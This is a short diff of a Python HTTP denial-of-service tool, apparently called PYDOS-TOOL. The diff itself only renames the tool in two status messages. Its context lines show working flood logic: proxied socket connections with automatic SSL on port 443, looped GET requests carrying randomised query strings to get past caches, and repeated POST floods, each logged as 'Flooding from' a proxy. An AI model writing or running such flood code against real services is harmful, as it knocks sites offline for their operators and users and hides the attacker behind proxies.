@@ -227,7 +227,7 @@ def cc(socks_type):
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
-			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] PYDOS-TOOL Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					get_host = "GET " + url2 + "?" + random.choice(strings)+str(random.randint(0,271400281257))+random.choice(strings)+str(random.randint(0,271004281257))+random.choice(strings) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -269,7 +269,7 @@ def post(socks_type):
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(request))
-			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
+			print ("[*] PYDOS-TOOL Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
